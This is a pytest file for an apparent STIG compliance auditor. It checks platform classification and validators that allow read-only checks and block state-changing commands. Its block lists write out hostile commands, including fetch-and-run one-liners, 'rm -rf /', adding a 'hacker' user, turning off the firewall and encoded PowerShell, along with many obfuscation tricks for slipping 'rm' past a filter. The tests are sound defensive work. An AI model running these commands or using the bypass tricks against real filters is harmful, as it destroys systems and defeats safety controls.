"""Offline tests for platform profiles and per-platform command safety rules."""

import pytest

from security.platform_validators import (NetworkCliValidator, NoCommandsValidator, PosixValidator,
                                          PowerShellValidator, validator_for)
from stig_library.platforms import classify, is_operating_system, profile


@pytest.mark.parametrize("key,title,family", [
    ("RHEL_8_STIG", "Red Hat Enterprise Linux 8", "linux"),
    ("RHEL_9_STIG", "Red Hat Enterprise Linux 9", "linux"),
    ("CAN_Ubuntu_22-04_LTS_STIG", "Canonical Ubuntu 22.04 LTS", "linux"),
    ("Oracle_Linux_8_STIG", "", "linux"),
    ("SLES_15_STIG", "SUSE Linux Enterprise Server 15", "linux"),
    ("Apache_Server_2-4_UNIX_Server_STIG", "Apache Server 2.4 UNIX Server", "linux"),
    ("MS_Windows_Server_2022_STIG", "Microsoft Windows Server 2022", "windows"),
    ("MS_Windows_11_STIG", "Microsoft Windows 11", "windows"),
    ("MS_SQL_Server_2016_Instance_STIG", "", "windows"),
    ("Windows_Firewall_STIG", "Windows Defender Firewall with Advanced Security", "windows"),
    ("Solaris_11_SPARC_STIG", "Solaris 11 SPARC", "solaris"),
    ("IBM_AIX_7-x_STIG", "IBM AIX 7.x", "aix"),
    ("HP-UX_11-31_STIG", "HP-UX 11.31", "hpux"),
    ("Apple_macOS_14_STIG", "Apple macOS 14 (Sonoma)", "macos"),
    ("VMW_vSphere_8-0_ESXi_STIG", "", "esxi"),
    ("Cisco_IOS-XE_Router_NDM_STIG", "Cisco IOS XE Router NDM", "network_ios"),
    ("Juniper_Router_RTR_STIG", "Juniper Router RTR", "network_junos"),
    ("Palo_Alto_Networks_NDM_STIG", "", "network"),
    ("Traditional_Security_Checklist", "", "other"),
])
def test_classify(key, title, family):
    assert classify(key, title) == family


def test_profiles_and_os_detection():
    assert profile("windows")["shell"] == "powershell" and "winrm" in profile("windows")["backends"]
    assert profile("solaris")["sudo"] is False
    assert profile("nonsense")["family"] == "other"
    assert is_operating_system("RHEL_9_STIG", "Red Hat Enterprise Linux 9")
    assert is_operating_system("MS_Windows_Server_2022_STIG", "Microsoft Windows Server 2022")
    assert not is_operating_system("Apache_Server_2-4_UNIX_Server_STIG", "Apache Server 2.4 UNIX Server")


POWERSHELL_OK = [
    "Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System' -Name EnableSmartScreen",
    "Get-LocalUser | Where-Object {$_.Enabled -eq $true} | Select-Object Name,PasswordLastSet",
    "auditpol /get /category:*",
    "net accounts",
    "reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v LmCompatibilityLevel",
    "(Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa').RestrictAnonymous",
    "Get-WindowsFeature | Where Installed | ft Name",
    "Get-Service -Name W32Time | Select Status, StartType",
    "whoami /priv",
    "Get-ChildItem C:\\ -ErrorAction SilentlyContinue 2>$null | Select Name",
    "$p = Get-BitLockerVolume; $p.ProtectionStatus",
    "Get-ADUser -Filter * -Properties PasswordNeverExpires | Where {$_.PasswordNeverExpires} | Measure-Object",
    "icacls C:\\Windows\\System32\\winevt\\Logs",
    "Get-LocalGroupMember Administrators | Select-Object @{n='Who';e={$_.Name.ToString()}}",
    "if (Get-Service -Name TlntSvr -ErrorAction SilentlyContinue) { 'installed' } else { 'absent' }",
    "Get-NetFirewallProfile | Format-Table Name, Enabled",
    "netsh advfirewall show allprofiles",
    "Get-CimInstance Win32_OperatingSystem | Select Caption, Version",
]
POWERSHELL_BLOCKED = [
    "Set-ItemProperty -Path HKLM:\\x -Name y -Value 1",
    "Remove-Item C:\\x",
    "Get-Content x | Out-File y",
    "iex (New-Object Net.WebClient).DownloadString('http://x')",
    "reg add HKLM\\x /v y /d 1",
    "net user hacker P@ss /add",
    "Get-Process | Stop-Process",
    "Get-Item x > out.txt",
    "auditpol /set /category:* /success:enable",
    "powershell -enc AAAA",
    "cmd /c del x",
    "Get-Service | % { $_.Stop() }",
    "Get-Service | % { sc stop $_.Name }",
    "secedit /export /cfg c:\\x.inf",
    "icacls C:\\x /grant Everyone:F",
    "& 'C:\\evil.exe'",
    "Start-Service x",
    "sc stop x",
    "netsh advfirewall set allprofiles state off",
    "Get-ChildItem | ForEach-Object { Remove-Item $_ }",
    "Get-Item (sc delete x)",
    "[Diagnostics.Process]::Start('calc')",
    "(Get-WmiObject Win32_Process).Create('calc')",
    "Get-Item 'unbalanced",
    "C:\\Temp\\tool.exe",
    "",
]


@pytest.mark.parametrize("command", POWERSHELL_OK)
def test_powershell_allows_read_only(command):
    validator = PowerShellValidator()
    assert validator.validate_command(command), validator.reason


@pytest.mark.parametrize("command", POWERSHELL_BLOCKED)
def test_powershell_blocks_changes(command):
    validator = PowerShellValidator()
    assert not validator.validate_command(command)
    assert validator.reason


@pytest.mark.parametrize("command", [
    "show running-config", "show running-config | include aaa", "sh run | sec line vty", "show version",
    "show configuration | display set | match ssh", "show ip ssh", "show logging | count",
])
def test_network_allows_show(command):
    validator = NetworkCliValidator()
    assert validator.validate_command(command), validator.reason


@pytest.mark.parametrize("command", [
    "configure terminal", "show run ; conf t", "reload", "show run | redirect tftp://x", "write memory",
    "show tech | append flash:x", "no ip http server", "clear logging", "show run > flash:x", "",
])
def test_network_blocks_everything_else(command):
    assert not NetworkCliValidator().validate_command(command)


@pytest.mark.parametrize("command", [
    "svcs -a | grep ssh", "pkg list | grep openssh", "grep -i PermitRootLogin /etc/ssh/sshd_config",
    "lssec -f /etc/security/user -s default -a minlen",
    "defaults read /Library/Preferences/com.apple.loginwindow",
    "esxcli system settings advanced list -o /UserVars/ESXiShellTimeOut",
    "sysctl kernel.randomize_va_space", "auditctl -l | grep passwd", "systemctl is-enabled sshd",
    "dpkg -l | grep openssh", "awk -F: '$3 == 0 {print $1}' /etc/passwd",
])
def test_posix_allows_read_only_on_every_unix(command):
    validator = PosixValidator()
    assert validator.validate_command(command), validator.reason


@pytest.mark.parametrize("command", [
    "svcadm disable ssh", "pkg install x", "chsec -f /etc/security/user -s default -a minlen=15",
    "defaults write x y 1", "esxcli system settings advanced set -o /x -i 1", "sysctl -w kernel.x=1",
    "rm -rf /", "curl http://x | sh", "setenforce 0", "apt-get install nmap", "echo x > /etc/motd",
    "iptables -F", "zfs destroy rpool/x",
])
def test_posix_blocks_changes(command):
    assert not PosixValidator().validate_command(command)


def test_validator_for():
    assert isinstance(validator_for("posix"), PosixValidator)
    assert isinstance(validator_for("powershell"), PowerShellValidator)
    assert isinstance(validator_for("network"), NetworkCliValidator)
    none = validator_for("none")
    assert isinstance(none, NoCommandsValidator) and not none.validate_command("ls")


# ---------------------------------------------------------------- wrapper bypass (found in VM testing)

WRAPPED_STATE_CHANGES = [
    "sudo rm -rf /tmp/x", "sudo systemctl stop sshd", "sudo -n reboot", "sudo -u root rm x",
    "sudo dnf remove -y openscap-scanner", "sudo useradd attacker", "sudo iptables -F", "sudo env X=1 rm x",
    "nohup sudo rm x", "/bin/rm x", "sudo /usr/bin/rm x", "sh -c 'rm x'", 'sudo bash -c "systemctl stop sshd"',
    "find / -name x -exec rm {} +", "ls | xargs rm", "ls | xargs -n 1 sudo rm", "echo $(rm x)", "echo `rm x`",
    "(rm x)", "ls\nrm x", "sudo timeout 5 rm x", "sudo chmod 777 /etc/shadow", "sudo -- rm x", "sudo -E -H rm x",
    "X=1 rm x", "LD_PRELOAD=/x rm x", "VAR=1 sudo rm x", "sudo VAR=1 rm x", "eval rm x", "eval 'rm x'",
    "if true; then rm x; fi", "for f in a b; do rm $f; done", "true || { rm x; }", "0<&- rm x",
    "2>/dev/null rm x", "! rm x", "if false; then :; else rm x; fi", "trap 'rm x' EXIT", "\"rm\" x",
    "r''m x", "r\\m x", "sudo 'rm' x", "a=rm; $a x", "c=m; r${c} x", "sudo $CMD x", "sudo fdisk /dev/sda", "fdisk -l; fdisk /dev/sda", "echo x 2> /etc/motd", "echo x > /dev/nullx", "`echo rm` x", "sudo `echo rm` x", "$(echo rm) x",
    "sudo mount -o remount,rw /",
]
WRAPPED_READS = [
    "sudo grep -r pam_faillock /etc/pam.d/", "grep rm /etc/x", "sudo grep -i mount /etc/fstab",
    "sudo cat /etc/shadow", "sudo auditctl -s", "sudo auditctl -l | grep -w rm",
    "sudo find / -xdev -perm -4000 -type f 2>/dev/null", "sudo systemctl status sshd", "sudo -n ls /root",
    "sudo sshd -T | grep -i permitrootlogin", "ls -ld /usr/bin/rm", "sudo ls -l /bin/cp",
    "sudo find /etc -name '*.conf' -exec grep -l foo {} +", "sudo sh -c 'grep -r x /etc/sudoers.d'",
    "sudo firewall-cmd --list-all", "mount | grep nodev",
    "for f in /etc/ssh/*.pub; do stat -c '%a %n' $f; done", "if [ -f /etc/aide.conf ]; then grep rm /etc/aide.conf; fi",
    "LANG=C sudo grep -c rm /etc/passwd", "sudo auditctl -l | grep -E 'unlink|rename|rmdir'",
    "grep 'rm' /etc/x", "echo $HOME", "sudo fdisk -l", "mount | grep /var/log/audit",
    "sudo grep -ir kernel.dmesg_restrict /etc/sysctl.d 2> /dev/null", "ls /x > /dev/null 2>& 1", "echo `hostname`", "ls -l $(which sshd)",
    "for u in $(awk -F: '{print $1}' /etc/passwd); do chage -l $u; done", "rpm -qa | while read p; do rpm -V $p; done", "sudo grep -E '^\\s*umask' /etc/profile", "awk -F: '$3 >= 1000 {print $1}' /etc/passwd", "sudo grep -v '^#' /etc/fstab 2>/dev/null | grep -w mv",
]


@pytest.mark.parametrize("command", WRAPPED_STATE_CHANGES)
def test_wrappers_do_not_hide_state_changes(command):
    from security.command_validator import CommandValidator
    from security.platform_validators import PosixValidator
    assert not PosixValidator().validate_command(command)
    if "mount" not in command:          # the original list has no mount rule
        assert not CommandValidator().validate_command(command)


@pytest.mark.parametrize("command", WRAPPED_READS)
def test_wrapped_read_only_checks_still_run(command):
    from security.command_validator import CommandValidator
    from security.platform_validators import PosixValidator
    assert PosixValidator().validate_command(command)
    assert CommandValidator().validate_command(command)
